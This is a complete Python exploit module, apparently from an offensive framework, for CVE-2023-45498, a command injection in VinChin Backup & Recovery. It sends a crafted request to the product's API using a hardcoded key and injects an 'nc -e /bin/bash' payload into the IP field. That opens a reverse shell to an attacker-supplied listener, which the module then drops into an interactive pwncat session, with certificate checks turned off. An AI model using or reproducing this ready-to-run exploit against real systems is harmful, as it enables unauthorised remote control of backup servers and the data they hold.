import socket
import requests
import threading
import pwncat.manager

from modules.io                           import *
from core.modular                         import Module
from requests.packages.urllib3.exceptions import InsecureRequestWarning

class Exploit(Module):
    def __init__(self):
        super().__init__()
        self.name = "CVE-2023-45498"
        self.description = "Command injection vulnerability in VinChin Backup & Recovery."
        self.author = "Chocapikk"
        self.creation_date = "16-11-2023"
        self.listener_thread = None
        self.connection_event = threading.Event()
        
    def start_listener(self, listener_ip, listener_port, event):
        try:
            print_status(f"Starting listener on {listener_ip}:{listener_port}")
            with socket.create_server((listener_ip, listener_port)) as listener:
                listener.settimeout(3)
                print_status("Waiting for incoming connection...")
                victim, victim_addr = listener.accept()
                print_success(f"Received connection from {victim_addr[0]}:{victim_addr[1]}")
                self.connection_event.set()

                with pwncat.manager.Manager() as manager:
                    manager.create_session(platform="linux", protocol="socket", client=victim)
                    print_status(f"Dropping to pwncat prompt on {listener_ip}:{listener_port}...")
                    manager.interactive()
        except socket.timeout:
            print_error("No reverse shell received within 3 seconds.")
        except Exception as e:
            print_error(f"An error occurred: {e}")
            pass

    def execute(self): 
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        listener_ip = input_data(self.name, "listener IP")
        listener_port = input_data(self.name, "listener port")
        target_host = input_data(self.name, "target host")
        target_port = input_data(self.name, "target port")

        if not (0 <= int(listener_port) <= 65535):
            print_error("Listener port must be 0-65535.")
            return
        if not (0 <= int(target_port) <= 65535):
            print_error("Target port must be 0-65535.")
            return

        self.listener_thread = threading.Thread(
            target=self.start_listener,
            args=(listener_ip, int(listener_port), self.connection_event)
        )
        self.listener_thread.start()

        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        params = {'m': '30', 'f': 'checkIpExists', 'k': '6e24cc40bfdb6963c04a4f1983c8af71'}
        data = f'p={{"ip":"127.0.0.1 ;nc -e /bin/bash {listener_ip} {listener_port}"}}'
        url = f"https://{target_host}:{target_port}/api/"

        try:
            print_status("Sending exploit...")
            response = requests.post(url, params=params, headers=headers, data=data, verify=False)
        except Exception as e:
            print_error(f"An error occurred while sending the exploit: {e}")
            self.connection_event.set()

        if not self.connection_event.wait(10):
            print_error("Exploit executed, but no reverse shell received. Check the target configuration and network settings.")

        if self.listener_thread.is_alive():
            self.listener_thread.join()
